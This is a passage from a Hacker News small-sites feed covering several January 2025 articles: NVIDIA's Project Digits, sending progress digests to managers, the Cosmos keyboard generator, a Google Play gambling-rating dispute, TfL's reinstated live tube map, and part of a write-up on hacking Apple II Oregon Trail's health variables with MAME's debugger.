-<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><article><div><div><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F99ee17d0-3c0a-430a-baef-756eed453192_1921x1080.heic" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F99ee17d0-3c0a-430a-baef-756eed453192_1921x1080.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F99ee17d0-3c0a-430a-baef-756eed453192_1921x1080.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F99ee17d0-3c0a-430a-baef-756eed453192_1921x1080.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F99ee17d0-3c0a-430a-baef-756eed453192_1921x1080.heic 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F99ee17d0-3c0a-430a-baef-756eed453192_1921x1080.heic" width="1456" height="819" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/99ee17d0-3c0a-430a-baef-756eed453192_1921x1080.heic&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:819,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:485908,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/heic&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F99ee17d0-3c0a-430a-baef-756eed453192_1921x1080.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F99ee17d0-3c0a-430a-baef-756eed453192_1921x1080.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F99ee17d0-3c0a-430a-baef-756eed453192_1921x1080.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F99ee17d0-3c0a-430a-baef-756eed453192_1921x1080.heic 1456w" sizes="100vw" fetchpriority="high"></picture><div><div></div></div></div></a></figure></div><p>One of the highlights of the annual Consumer Electronics Show (CES) has been the NVIDIA keynote for as long as they’ve been around –&nbsp;it’s a much different affair from the usual efforts by Samsung, LG, Sony and others which just feel like marketing decks for home electronics buyers but performed on stage with a relatively inflated A/V budget. NVIDIA’s keynote, delivered by its charismatic CEO Jensen Huang, offers a more wide-ranging and ambitious look at the future –&nbsp;as powered by NVIDIA tech, of course.</p><p>This year, NVIDIA’s keynote focused on AI, which is to be expected given that company’s foundational role in underpinning much of the advancements made in the era of the LLM. Alongside new foundational world models, and a platform for helping individuals train and test the next generation of AI-powered robots, Huang also revealed ‘Project Digits,’ a new product based on its Grace Blackwell AI-specific architecture that aims to offer at-home AI processing capable of running 200 billion-parameter models locally for a projected retail cost of around $3,000.</p><p><span>My former colleague Kyle Wiggers has a great </span><a href="https://techcrunch.com/2025/01/06/nvidias-project-digits-is-a-personal-ai-computer/" rel="">rundown of the specs and capabilities of the initial ‘Project Digits’ offering at TechCrunch</a><span>, which NVIDIA is developing and shipping with partners (much like it does with its consumer GPUs currently –&nbsp;an important point of comparison). The bottom line is that it can provide unprecedented local AI compute at a –&nbsp;while still expensive –&nbsp;extremely affordable price point, relatively speaking.</span></p><p>Based on Huang’s statement to Kyle, the initial target market for Project Digits isn’t necessarily just your average home PC user; he specifically called out the intent of putting AI supercompute capability in the hands of “every data scientist, AI researcher and student,” so there’s an assumption that at least partial specialty and technical familiarity will be part of the ideal customer profile out the gate.</p><p>There are many exciting things about Project Digits, including the fact that two can be paired to offer 405 billion-parameter model support for ‘just’ $6,000 (again, sounds like a lot, but tiny compared to what has previously been available), and its ability to play nice with both Windows and Mac – as well as to operate independently using its built-in Linux-based DGX OS. But what’s most exciting about it is probably what it indicates in terms of NVIDIA’s strategy around consumer AI and what comes next.</p><p>If NVIDIA and its partners can deliver a capable product that lives up to its promises on Project Digits at its target price point, that will drive a lot of interest, and may start turning the flywheel for future cost reductions, along with performance and efficiency improvements that make possible a more mature product line with varying price points depending on needs. It could, in fact, look a lot like NVIDIA’s current GPU line, which offers tiers of performance at different price levels depending on the needs and budgets of its gaming customers. </p><p>These could fit neatly with different parameter-sizing in terms of model support, and NVIDIA has a well-established playbook when it comes to working with licensed hardware partners to co-brand and distribute this kind of product lineup. </p><p>The remaining challenge in terms of this growing from an interesting but minuscule side-business aimed at professional researchers and a few amateur enthusiasts lies on the software side; in GPUs, NVIDIA benefits from an extremely mature and diversified gaming market to drive demand for its products –&nbsp;in AI, and generative AI in particular, the user-facing software product side is less well-established. Most of the paradigms we’ve seen so far either focus on A) simple, cloud-based products like ChatGPT and Claude or B) more complex, specialist-only implementations like local installations of Stable Diffusion, Meta’s Llama or similar.</p><p>If we see a proliferation of AI products with an accessible and easy-to-learn user experience, paired with local offline backend, then we could definitely see this become an area of rapidly ramping investment and interest for NVIDIA. With Project Digits, we at least see the company looking to solve one part of that particular chicken and egg problem.</p></div></div></div></article></div></div></div><div><div id="discussion"><div><h4>Discussion about this post</h4></div></div></div></div>]]>
-            </description>
-            <link>https://www.theangle.com/p/nvidia-might-do-for-desktop-ai-what</link>
-            <guid isPermaLink="false">hacker-news-small-sites-42687510</guid>
-            <pubDate>Mon, 13 Jan 2025 19:19:42 GMT</pubDate>
-        </item>
-        <item>
-            <title>
-<![CDATA[Document Your Progress at Work]]>
-            </title>
-            <description>
-<![CDATA[
-Score 57 | Comments 3 (<a href="https://news.ycombinator.com/item?id=42687148">thread link</a>) | @tminima
-<br/>
-January 13, 2025 | https://shivamrana.me/2025/01/document-your-progress/ | <a href="https://web.archive.org/web/*/https://shivamrana.me/2025/01/document-your-progress/">archive.org</a>
-<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
-    <p><strong>How can you ensure that your contributions are also recognized?</strong></p>
-
-<p>A common challenge, especially in larger organizations, is that your manager may not always be fully aware of the specifics of your work, and your manager’s manager likely has even less visibility. It isn’t due to a lack of interest but rather the sheer volume of responsibilities and information they handle. Additionally, even for you, it’s hard to remember all the details beyond the highlights. I find a proactive strategy essential for such scenarios: sending <strong>regular progress digests.</strong></p>
-
-<p>These digests are concise, structured email updates that you send periodically to both direct manager and their manager. The aim is to offer a clear snapshot of your activities, their impact, and your forthcoming plans. See it as a method to keep your supervisors well-informed, especially when you lack regular direct interactions.</p>
-
-<p>That’s it. That is the idea. You can be creative and apply it however you want. However you decide to do it, you will see gains.</p>
-
-<p>In the next section, I list the <strong>key points</strong> I usually consider in my snapshots.</p>
-
-<h2 id="key-elements-of-an-effective-progress-digest">Key Elements of an Effective Progress Digest</h2>
-
-<p>To ensure your digests are both informative and impactful, here’s what you can include:</p>
-
-<ul>
-  <li><strong>Specific Task Details</strong>: Provide project specifics and relevant links to the completed/picked coding tasks. It entails a 1-sentence project description, PR links, JIRA tickets and other code artefacts.</li>
-  <li><strong>Data Science Related</strong>: If applicable, detail the models you’ve trained and deployed. Any A/B experiments launched and test results of the ones that concluded. Also, share the project solutioning doc here.</li>
-  <li><strong>Documentation Efforts</strong>: Highlight any documentation you’ve created or maintained. You can also merge this with other points.</li>
-  <li><strong>Impact and Results</strong>: Clearly articulate the outcomes of your tasks and their value to the team and company.</li>
-  <li><strong>Initiatives and Discussions</strong>: Share any new ideas you’ve put forward or discussions you’ve initiated.</li>
-  <li><strong>Future Plans</strong>: Outline your planned next steps.</li>
-</ul>
-
-<h2 id="benefits">Benefits</h2>
-
-<p>The effort invested in creating these digests yields substantial career benefits:</p>
-
-<ul>
-  <li><strong>Enhances Diligence</strong>: Summarizing your work makes you more conscious of your efforts.</li>
-  <li><strong>Boosts Positive Perception</strong>: You are perceived as a proactive and accomplished individual.</li>
-  <li><strong>Creates a Performance Record</strong>: These digests serve as valuable documentation of your work, valuable during performance reviews.</li>
-  <li><strong>Ensures Visibility</strong>: Even if managers don’t respond directly to each email, they will read them, which ensures they are aware of your work and its progress.</li>
-  <li><strong>Effective at Any Stage:</strong> While this practice is advantageous when starting a new job (or joining a new team), I have found it beneficial at any stage.</li>
-</ul>
-
-<h2 id="conclusion">Conclusion</h2>
-
-<p>Actively managing your visibility is key to long-term career growth. Sending out regular progress digests ensures that your work is recognized. You also establish a record of your accomplishments and demonstrate your value. This practice requires regular work but has good returns.</p>
-
-<p>PS: I learned this trick on a tech podcast many years ago. If anyone knows which podcast or episode, please share it with me, and I will link it here.</p>
-
-<p><strong>Update: 14th Jan</strong></p>
-
-<p>PS: A related idea of <a href="https://jvns.ca/blog/brag-documents/">brag documents</a> explained beautifully by <a href="https://jvns.ca/">Julia Evans</a>. Shared on this <a href="https://news.ycombinator.com/item?id=42695837">HN comment</a>.</p>
-
-  </article></div>]]>
-            </description>
-            <link>https://shivamrana.me/2025/01/document-your-progress/</link>
-            <guid isPermaLink="false">hacker-news-small-sites-42687148</guid>
-            <pubDate>Mon, 13 Jan 2025 18:57:38 GMT</pubDate>
-        </item>
-        <item>
-            <title>
-<![CDATA[Cosmos Keyboard: Scan your hand, build a keyboard]]>
-            </title>
-            <description>
-<![CDATA[
-Score 375 | Comments 81 (<a href="https://news.ycombinator.com/item?id=42686144">thread link</a>) | @cdata
-<br/>
-January 13, 2025 | https://ryanis.cool/cosmos/ | <a href="https://web.archive.org/web/*/https://ryanis.cool/cosmos/">archive.org</a>
-<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>    <header><a href="https://ryanis.cool/cosmos/" data-svelte-h="svelte-1uyffsw">  <span><span></span> <span>BETA</span></span></a> <ul data-svelte-h="svelte-zh0d27"><li><a href="https://ryanis.cool/cosmos/docs/">Docs</a></li> <li><a href="https://ryanis.cool/cosmos/showcase">Showcase</a></li> <li><a href="https://ryanis.cool/cosmos/blog/">Blog</a></li></ul> </header>  <section><div data-svelte-h="svelte-zwmpif"><p>Custom-Build A Keyboard Fit To You</p> <p>Don't Settle</p> <p>For One-Size-Fits-All</p></div> <div data-svelte-h="svelte-10tpkiy"><p><img src="https://ryanis.cool/cosmos/alien.svg" alt=""></p><video playsinline="" autoplay="" muted="" loop="" poster="https://ryanis.cool/cosmos/cosmos-cover.png"><source type="video/mp4" src="https://ryanis.cool/cosmos/cosmos.mp4"></video> <p><img src="https://ryanis.cool/cosmos/monster.svg" alt=""></p></div> <a href="https://ryanis.cool/cosmos/beta">Try the Beta
-    <svg viewBox="0 0 24 24" width="100%" height="100%"><path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z" fill="currentColor"></path></svg></a></section> <section>  <p><a href="https://ryanis.cool/cosmos/showcase">See more keyboards in the showcase
-      <svg viewBox="0 0 24 24" width="20px" height="20px"><path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z" fill="currentColor"></path></svg></a></p></section> <section data-svelte-h="svelte-ok5n3u"><img src="https://ryanis.cool/cosmos/hand.svg" alt=""> <h2>Scan Your Hand, Build a Keyboard</h2> <p>Cosmos is the easiest way to design a keyboard around your one-of-a-kind hands. Scan your hand using
-    just your phone camera, then fit a keyboard to the scan. The key positions align to your fingers'
-    lengths and movement.</p></section> <section><img src="https://ryanis.cool/cosmos/all.svg" alt=""> <h2 data-svelte-h="svelte-1rrmij7">Add All The Things</h2> <p data-svelte-h="svelte-qipttn">Add a trackball, trackpad, encoder, or OLED display. There's support for MX, Choc, and Alps switches,
-    and almost every type of keycap. Plus with 7 different microcontrollers, you can mix and match all
-    you like.</p> <a href="https://ryanis.cool/cosmos/parts">Browse the Parts
-    <svg viewBox="0 0 24 24" width="100%" height="100%"><path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z" fill="currentColor"></path></svg></a></section> <section data-svelte-h="svelte-bxr0tk"><div><h2>Generate Stunning Keyboards</h2> <p>Choose from 3 types of cases, split or unibody, and many customizations.</p> <p><img src="https://ryanis.cool/cosmos/cases.png" alt="Keyboards generated with Cosmos"></p></div> <div><div><h2>Print Worry-Free</h2> <p>Cosmos catches errors before you print and automatically fixes common model issues.</p></div> <div><h2>Take Control</h2> <p>Custom Thumbs mode allows you to drag and drop keys and trackballs in the thumb cluster into
-        place.</p></div></div> <div><div><h2>Mix and Match Keycaps</h2> <p>Your artisans are now ergonomic. Whatever batch of keycaps you decide to use, Cosmos will arrange
-        them to fit your desired curvature.</p> <p><img src="https://ryanis.cool/cosmos/adaptive.png" alt="Keys with different styles of keycaps with their tops lined up"></p></div> <div><h2>RGB and Hotswap Ready</h2> <p>Cosmos has first-class support for Amoeba King PCBs, which let you easily integrate per-key RGB
-        and hotswap sockets. It also has high-quality built-in-hotswap and PCB-less options if you're on
-        a budget.</p> <p><img src="https://ryanis.cool/cosmos/hotswapsockets.png" alt="Hotswap sockets in Cosmos"></p></div></div></section> <p data-svelte-h="svelte-9b7uey">And last but not least…</p> <section><img src="https://ryanis.cool/cosmos/fusion-keyboard.png" alt="Keyboard in Autodesk Fusion"> <h2 data-svelte-h="svelte-a6hq5h">Give it to your CAD friend</h2> <p data-svelte-h="svelte-q4bwj0">Every model can export to STLs, which are meant to be sent to your 3D printer or an online printing
-    service, or to STEP models, which can be modified in CAD programs. If you don't like the way your
-    model looks, ask your closest CAD guru to make adjustments.</p> <a href="https://ryanis.cool/cosmos/docs/cad/">Learn About CAD Export
-    <svg viewBox="0 0 24 24" width="100%" height="100%"><path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z" fill="currentColor"></path></svg></a></section> <section><h2 data-svelte-h="svelte-ia1hcf">Join us in revolutionizing keyboard design.</h2> <div><p data-svelte-h="svelte-n5l7h4">Cosmos is <a href="https://ryanis.cool/cosmos/blog/category/technical/">made in the open</a>, and 95% of
-      <a href="https://github.com/rianadon/Cosmos-Keyboards">the code</a> is open-source. It's
-      our firm belief everyone should have free access to technology to relieve and prevent typing pain.</p> <p data-svelte-h="svelte-1nu7jem">Come see the unique keyboards we all are making on the Discord server.</p>  <p>Don't have an account? I send a few recaps per year to <a href="https://newsletter.ryanis.cool/subscribe/">my newsletter <svg viewBox="0 0 24 24" width="20" height="20"><path d="M20,8L12,13L4,8V6L12,11L20,6M20,4H4C2.89,4 2,4.89 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V6C22,4.89 21.1,4 20,4Z" fill="currentColor"></path></svg></a>.</p> <p data-svelte-h="svelte-2wodis">The other 5% of code? That's for the Pro features, which add extra cosmetic options to your
-      keyboard and help keep this project sustainable.</p></div></section> <section><h2 data-svelte-h="svelte-z2trqr">Sound fun?</h2> <a href="https://ryanis.cool/cosmos/beta">Try the Beta
-    <svg viewBox="0 0 24 24" width="100%" height="100%"><path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z" fill="currentColor"></path></svg></a> <p data-svelte-h="svelte-hd9nuq">Psst! Come here from my Dactyl generator? You should give Cosmos a try. It's changing a&nbsp;lot but
-    it will give you a much better Dactyl-like case and microcontroller holder.</p></section>   
-			
-			
-		</div></div>]]>
-            </description>
-            <link>https://ryanis.cool/cosmos/</link>
-            <guid isPermaLink="false">hacker-news-small-sites-42686144</guid>
-            <pubDate>Mon, 13 Jan 2025 17:42:00 GMT</pubDate>
-        </item>
-        <item>
-            <title>
-<![CDATA[Luck Be a Landlord Might Be Banned from Google Play]]>
-            </title>
-            <description>
-<![CDATA[
-Score 127 | Comments 157 (<a href="https://news.ycombinator.com/item?id=42683567">thread link</a>) | @doppp
-<br/>
-January 13, 2025 | https://blog.trampolinetales.com/luck-be-a-landlord-might-be-banned-from-google-play-2/ | <a href="https://web.archive.org/web/*/https://blog.trampolinetales.com/luck-be-a-landlord-might-be-banned-from-google-play-2/">archive.org</a>
-<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
-        <p>Happy New Year everyone! Just three hours into 2025, I received an email from Google Play Support with the following subject line:</p><blockquote>Action Required: Your app is not compliant with Google Play Policies (Luck be a Landlord)</blockquote><p>Nothing has changed with Luck be a Landlord in the past few months, but for whatever reason, my game "contains gambling" now!</p><figure><img src="https://blog.trampolinetales.com/content/images/2025/01/Screenshot-from-2025-01-01-10-29-53.png" alt="" loading="lazy" width="562" height="185"></figure><p>I've already gone through this song and dance multiple times with Google Play over the <a href="https://blog.trampolinetales.com/luck-be-a-landlord-is-now-banned-in-13-countries-on-the-google-play-store/" rel="noreferrer">game being banned by them in 13 countries</a>, so while this isn't exactly new, it's a lot scarier!</p><p>I genuinely think Luck be a Landlord deserves the equivalent of an E10+ rating across all regions, but at this point I've just given up and will deal with whatever inaccurate rating is slapped on the game.</p><p>I've now filled out the Google Play age rating questionnaire to "agree" that my game "contains gambling." I'm doing this in an attempt to stop my game from being banned globally on Google Play since every time I've tried to appeal these decisions I've simply been sent a screenshot of my game and was told "this is gambling."</p><p>Whatever happens, I hope you're still able to play my game on your Android device in 2025.</p><p>If not, consider subscribing to this newsletter for more information on my next game! Here are some stills from its upcoming trailer:</p><figure><img src="https://blog.trampolinetales.com/content/images/2025/01/1.jpg" alt="" loading="lazy" width="1920" height="1080" srcset="https://blog.trampolinetales.com/content/images/size/w600/2025/01/1.jpg 600w, https://blog.trampolinetales.com/content/images/size/w1000/2025/01/1.jpg 1000w, https://blog.trampolinetales.com/content/images/size/w1600/2025/01/1.jpg 1600w, https://blog.trampolinetales.com/content/images/2025/01/1.jpg 1920w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://blog.trampolinetales.com/content/images/2025/01/2.jpg" alt="" loading="lazy" width="1920" height="1080" srcset="https://blog.trampolinetales.com/content/images/size/w600/2025/01/2.jpg 600w, https://blog.trampolinetales.com/content/images/size/w1000/2025/01/2.jpg 1000w, https://blog.trampolinetales.com/content/images/size/w1600/2025/01/2.jpg 1600w, https://blog.trampolinetales.com/content/images/2025/01/2.jpg 1920w" sizes="(min-width: 720px) 720px"></figure>
-    </div></div>]]>
-            </description>
-            <link>https://blog.trampolinetales.com/luck-be-a-landlord-might-be-banned-from-google-play-2/</link>
-            <guid isPermaLink="false">hacker-news-small-sites-42683567</guid>
-            <pubDate>Mon, 13 Jan 2025 14:10:33 GMT</pubDate>
-        </item>
-        <item>
-            <title>
-<![CDATA[Live London Underground / bus maps taken down by TfL trademark complaint]]>
-            </title>
-            <description>
-<![CDATA[
-Score 222 | Comments 86 (<a href="https://news.ycombinator.com/item?id=42682876">thread link</a>) | @fanf2
-<br/>
-January 13, 2025 | https://traintimes.org.uk/map/tube/ | <a href="https://web.archive.org/web/*/https://traintimes.org.uk/map/tube/">archive.org</a>
-<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="info_shown">
-<p><a href="" onclick="Info.Hide(); return false;">Hide</a>
-
-</p>
-
-<!-- In the meantime, you can <a href="https://www.flickr.com/photos/vicchi/4730203122/">see a video of
-the site in action</a> courtesy of Gary Gale. -->
-
-<h2>Update&nbsp;– 14th January 2025</h2>
-
-<p>
-TfL have apologised for the way that their “online brand protection agency”
-handled this and their approach to my hosting provider, and will be discussing
-matters with them. Given that, and the numerous emails I have been receiving
-from people missing the maps, I’m happy to reinstate them.
-</p>
-
-<h2>How does it work?</h2>
- <p><img src="https://traintimes.org.uk/map/tube/i/trophy.png" height="100" width="55" alt="2nd prize App in the Open Data Challenge"></p><p>Live departure data is fetched from the
-<a href="https://tfl.gov.uk/info-for/open-data-users/"><abbr title="Transport for London">TfL</abbr> API</a>
-(Powered by TfL Open Data), and then it does a bit of maths and magic.
-Some <abbr title="Hammersmith and City">H&amp;C</abbr> and Circle stations are
-missing in the TfL feed.
-</p>
-
-<h2>Who did this?</h2>
-<p><a href="https://dracos.co.uk/">Matthew Somerville</a>
-(with helpful hinderances from <a href="https://twitter.com/phae">Frances Berriman</a> and <a href="https://twitter.com/jaylett">James Aylett</a>).
-Station icon by <a href="https://www.red56.uk/">Tim Diggins</a>.
-</p>
-
-
-
-  </div></div>]]>
-            </description>
-            <link>https://traintimes.org.uk/map/tube/</link>
-            <guid isPermaLink="false">hacker-news-small-sites-42682876</guid>
-            <pubDate>Mon, 13 Jan 2025 12:51:37 GMT</pubDate>
-        </item>
-        <item>
-            <title>
-<![CDATA[Can you complete the Oregon Trail if you wait at a river for 14272 years?]]>
-            </title>
-            <description>
-<![CDATA[
-Score 230 | Comments 116 (<a href="https://news.ycombinator.com/item?id=42682813">thread link</a>) | @donohoe
-<br/>
-January 13, 2025 | https://moral.net.au/writing/2025/01/11/waiting_for_oregon/ | <a href="https://web.archive.org/web/*/https://moral.net.au/writing/2025/01/11/waiting_for_oregon/">archive.org</a>
-<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
-<div>
-<div>
-
-<p><i>11 January 2025</i></p>
-<p><img alt="A screenshot from the main gameplay view of Oregon Trail, showing a covered wagon drawn by oxen near a river, and cheerfully informing you that Zeke has a broken leg and will die soon." src="https://moral.net.au/writing/2025/01/11/waiting_for_oregon/header.png" title="Goddamnit Zeke I turn my head for ONE SECOND"></p><p>If you're into retro computing, you probably know about Oregon Trail; a simulation of the hardships faced by a group of colonists in 1848 as they travel by covered wagon from Independence Missouri to the Willamette Valley in Oregon. The game was wildly successful in the US education market, with the various editions selling 65 million copies. What you probably <em>don't</em> know is the game's great untold secret.</p>
-<p>Two years ago, Twitch streamer <a href="https://www.twitch.tv/albrot">albrot</a> discovered a bug in the code for crossing rivers. One of the options is to "wait to see if conditions improve"; waiting a day will consume food but <em>not</em> recalculate any health conditions, granting your party immortality.</p>
-<p>From this conceit the Oregon Trail Time Machine was born; a multiday livestream of the game as the party waits for conditions to improve at the final Snake River crossing until the year 10000, to see if the withered travellers can make it to the ruins of ancient Oregon. The <a href="https://www.twitch.tv/videos/1738411118?t=01h04m40s">first attempt ended in tragedy</a>; no matter what albrot tried, the party would succumb to disease and die almost immediately.</p>
-<p>A couple of days before New Years Eve 2025, albrot reached out and asked if I knew anything about Apple II hacking. In reality the answer was no, I knew three things about the Apple II:</p>
-<ul>
-<li>It has a MOS 6502 processor</li>
-<li>It was popular in the US educational market</li>
-<li>Something something Carmen Sandiego something Prince of Persia?</li>
-</ul>
-<p>But all old computers are basically the same right? Specialist knowledge is for cowards.</p>
-<div id="where-to-start">
-<h2>Where to start</h2>
-<p>First I loaded Oregon Trail into MAME's Apple II emulator. MAME is an emulator that was originally targeted at arcade hardware, however it has support for hundreds of game consoles and home computer systems thanks to merging with the MESS project. It has one of the nicest debuggers I've ever used, with plenty of documentation, which is why I strongly recommend it for reversing work. You will need a copy of the Apple II ROMs, listed in the MAME ROM index as <tt>apple2e.zip</tt>.</p>
-<p>We are using the most common disk image of the game (aka "peperony and chease" edition). To open the game:</p>
-<div><pre><span></span>mame<span> </span>apple2e<span> </span>-debug<span> </span>-flop1<span> </span>oregonmod_a.do
-</pre></div>
-<p>This will open a separate Debug window and pause execution until you start running the machine (F5). In the game window you can activate the MAME menu keys by pressing Scroll Lock; useful ones to know are TAB for the main menu, F6 for saving a state, F7 for loading a state.</p>
-<p>This was my thinking for how to get a first toehold into what was going on. As you travel, the game gives your party one of four health ratings:</p>
-<ul>
-<li>good</li>
-<li>fair</li>
-<li>poor</li>
-<li>very poor</li>
-</ul>
-<p>It follows that the game code must read the text string "poor" from somewhere in memory so it can be printed on the screen, and this code would be attached to the routine that determines how sick everyone is. So I sent the party off from Independence, Missouri with 1 ox, no food and no clothes. As soon as we were on the road, I made a save state. I then called "Step Into" in the debugger (F11) which paused execution, and made a dump of the Apple II's memory to a file with the following command:</p>
-<div><pre><span></span>save<span> </span>/tmp/mem_before,0,0x10000
-</pre></div>
-<p>I loaded this dump into a hex editor and searched for the word "poor", which I found at address 0xA6AE. Then in the debugger I added a watchpoint for any code attempting to read the first byte of "poor":</p>
-
-<p>As expected, once my party became emaciated enough the debugger halted execution at the following instruction:</p>
-
-<p>The Apple II CPU is a 6502, which has a nice <a href="http://6502.org/users/obelisk/6502/reference.html">instruction reference</a> here. Looking it up, we can see that LDA basically means "load a byte from the address stored at 0x005E into register A". Because the 6502 is a very basic 8-bit CPU, you are limited in how you access the 16-bit address space. Generally speaking you have the choice of using a fixed offset (up to 16-bit, baked in the instruction) plus whatever 8-bit value is in a register, or using a Zero Page pointer. The above instruction is using a Zero Page address; for this mode you have to write a 16-bit pointer containing the location you want to somewhere in the first 0x100 bytes of memory, then use an instruction which references that pointer.</p>
-<p>So we know that the pointer to the text describing the player's health is at 0x005E, which we can confirm by opening a memory window in the debugger and see AE A6 at address 0x005E (the 6502 is little endian, so addresses are stored backwards). It's fair to say that this is just for updating the display, and not for checking how ill everyone is.</p>
-<p>We need to find the code that sets this status, so I added another watchpoint for any writes to the pointer at 0x005E:</p>
-<div><pre><span></span>wpset<span> </span>0x005E,1,w,wpdata<span> </span><span>==</span><span> </span>0xAE
-</pre></div>
-<p>After reload the save state, the game stopped in another area:</p>
-<div><pre><span></span>E630<span>  </span>STX<span> </span><span>$5</span>E<span>       </span><span>;</span><span> </span>mem<span>[</span>0x005E<span>]</span><span> </span><span>=</span><span> </span>X
-</pre></div>
-<p>I started using the debugger's Step Out feature (Shift+F11) to move up the call stack and see what was calling what. From further poking around it became apparent that we were in some sort of generic high level text printing function. Then a penny dropped, and I started wondering about the memory layout of the Apple II. A <a href="http://apple2.guidero.us/doku.php/mg_notes/general/mem_map">memory map</a> shows the D000–F7FF range to be the part of the ROM containing the BASIC interpreter. Oh.</p>
-<p>In fact there's a <a href="https://6502disassembly.com/a2-rom/Applesoft.html#SymFREFAC">very helpful annotated Apple II ROM disassembly</a>, showing that function is indeed a high-level print function for text.</p>
-</div>
-<div id="well-that-just-got-complicated">
-<h2>Well that just got complicated</h2>
-<p>So 1985 Oregon Trail is written in <a href="https://en.wikipedia.org/wiki/Applesoft_BASIC">Applesoft BASIC</a>, and the program is stored as some sort of bytecode. My heart sank a little at this news; 6502 assembly is cumbersome to understand at the best of times, and throwing a BASIC virtual machine on top of that makes live debugging even worse. I didn't have time to hack together a way to trace the BASIC code as it executed.</p>
-<p>However this did open up a new angle of attack. A BASIC program uses variables, which are stored in a known location in a known format. What if we let the game play, then kept an eye on the debugger's live memory view to see what variables change over time?</p>
-<p>The good news is that Applesoft BASIC keeps the original names for each variable; a critical clue. The downside is that those names are (at most) two letters long. Also the memory is managed dynamically, so variables will move around as the program chugs on.</p>
-<p>From poking around the ROM disassembly, the pointer to the variable store is at address 0x0069 of the Zero Page (usually 0x9902), followed by a pointer to the array store, and a pointer to all of the string data. Each variable is 7 bytes long; 2 bytes for the name (using the high bits of each to encode type), and 5 bytes data. The default numeric type in Applesoft BASIC is a cursed 40-bit floating point format, with an 8-bit exponent and a 31-bit mantissa.</p>
-<p>After a bunch of test runs I found a variable called H, which increased in line with my health status getting worse. Even better, setting the H data to all zeros reset the status back to "good", after which it seemed to decay back to "very poor" at the previous rate. There was also a H1 array that seemed to keep track of party members that had died (0 for alive, -1 for dead), and a H2 array which seemed to keep track of whatever exciting disease each party member had. Easy! Open and shut!</p>
-</div>
-<div id="did-we-make-it">
-<h2>Did we make it?</h2>
-<p>New Years Eve 2025 had arrived, and with it attempt 2 to reach the barren wastelands of future Oregon. This time, the time machine stopped at 16120 AD.</p>
-<p><img alt="A screenshot of albrot's second Oregon Trail Time Machine attempt, some 5 days after the stream began. There is a tombstone that reads &quot;Here lies ALBROT&quot;. The streamer is facepalming." src="https://moral.net.au/writing/2025/01/11/waiting_for_oregon/rip.jpg" title="RIP albrot, what was he even doing up on the roof"></p><p>A dismal failure. Even when zeroing out the memory, every day H would reset to 139, dooming the party to a short-but-agonizing fate. Cheating death is harder than expected.</p>
-</div>
-<div id="we-can-still-save-this">
-<h2>We can still save this</h2>
-<p>Several days later, I tried writing a scrappy decompiler for the Applesoft BASIC bytecode. From past experience I was worried this would be real complex, but in the mother of all lucky breaks the "bytecode" is the original program text with certain keywords replaced with 1-byte tokens. After nicking the list of tokens from the Apple II ROM disassembly I had a half-decent decompiler after a few goes.</p>
